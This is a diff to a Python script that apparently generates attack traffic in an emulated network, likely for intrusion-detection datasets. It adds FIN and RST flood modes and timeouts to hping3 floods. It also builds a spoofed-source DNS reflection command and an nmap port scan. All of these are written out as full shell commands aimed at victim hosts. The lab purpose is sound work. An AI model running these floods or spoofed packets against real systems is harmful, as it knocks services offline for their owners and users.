@@ -60,9 +60,13 @@ def __get_dos_cmd(victim, duration, method):
     if method == "ping":
         return "ping -f -c " + str(duration * 10) + " " + victim.IP() + " &"
     elif method == "syn":
-        return "hping3 -S -p 80 -i u1000 " + str(victim.IP()) + " &"
+        return "timeout " + str(duration) + "s hping3 -S -p 80 -i u1000 " + str(victim.IP()) + " &"
+    elif method == "fin":
+        return "timeout " + str(duration) + "s hping3 -F -p 80 -i u1000 " + str(victim.IP()) + " &"
+    elif method == "rst":
+        return "timeout " + str(duration) + "s hping3 -R -p 80 -i u1000 " + str(victim.IP()) + " &"
     elif method == "udp":
-        return "hping3 --udp -p 123 -i u1000 " + str(victim.IP()) + " &"
+        return "timeout " + str(duration) + "s hping3 --udp -p 123 -i u1000 " + str(victim.IP()) + " &"
     else:
         print("[!] Unknown DoS method: " + method)
         return None
@@ -92,7 +96,6 @@ def ddos(victim, attackers, duration, method, split=5):
     time.sleep(duration)
 
 
-# todo: repair this to run as long as I want it
 def reflected_dos(victim, attacker, dns_server, duration):
     print("\n[*] Starting reflected DoS using spoofed DNS requests...")
     # dns_cmd = "dnsmasq --no-daemon --log-queries --log-facility=- &"
@@ -102,20 +105,20 @@ def reflected_dos(victim, attacker, dns_server, duration):
     dns_server.cmd("nohup python3 -m http.server 53 >/dev/null 2>&1 &")  # dummy server using port 53
 
     # Use scapy or hping3 to send spoofed UDP packets to port 53
-    cmd = "hping3 --udp -a " + victim.IP() + " -p 53 -i u1000 " + dns_server.IP() + " &"
+    cmd = "timeout " + str(duration * 10) + "s hping3 --udp -a " + victim.IP() + " -p 53 -i u1000 " + dns_server.IP() + " &"
     print("-- Attacker: " + cmd)
     attacker.cmd(cmd)
     time.sleep(duration)
 
 
-# DOES NOT WORK (with nmap installed), maybe try hping3
 def port_scan(victim, attacker, duration):
     print("\n[*] Starting port scan...")
-    victim.cmd("nohup nc -lkp 80 >/dev/null 2>&1 &")
-    victim.cmd("nohup nc -lkp 443 >/dev/null 2>&1 &")
 
-    cmd = "nmap -sT -p 80,443 " + victim.IP() + " &"
-    # cmd = "hping3 -S -p 80 -i u10000 " + victim.IP() + " &"
+    common_ports = [22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 8080]
+    for port in common_ports:
+        victim.cmd("nohup nc -lkp " + str(port) + " >/dev/null 2>&1 &")
+
+    cmd = "nmap -sT -T3 -p 1-1024 " + str(victim.IP())
     print("-- Attacker: " + cmd)
     attacker.cmd(cmd)
     time.sleep(duration)
@@ -157,6 +160,10 @@ def generate_traffic(scenario, pcap_file=PCAP_FILE_NAME, debug_mode=False):
             simple_dos(victim=h1, attacker=a1, duration=duration, method="ping")
         elif attack_type == "syn_flood":
             simple_dos(victim=h1, attacker=a1, duration=duration, method="syn")
+        elif attack_type == "fin_flood":
+            simple_dos(victim=h1, attacker=a1, duration=duration, method="fin")
+        elif attack_type == "rst_flood":
+            simple_dos(victim=h1, attacker=a1, duration=duration, method="rst")
         elif attack_type == "udp_flood":
             simple_dos(victim=h1, attacker=a1, duration=duration, method="udp")
 
@@ -165,6 +172,10 @@ def generate_traffic(scenario, pcap_file=PCAP_FILE_NAME, debug_mode=False):
             ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="ping")
         elif attack_type == "syn_ddos":
             ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="syn")
+        elif attack_type == "fin_ddos":
+            ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="fin")
+        elif attack_type == "rst_ddos":
+            ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="rst")
         elif attack_type == "udp_ddos":
             ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="udp")
 
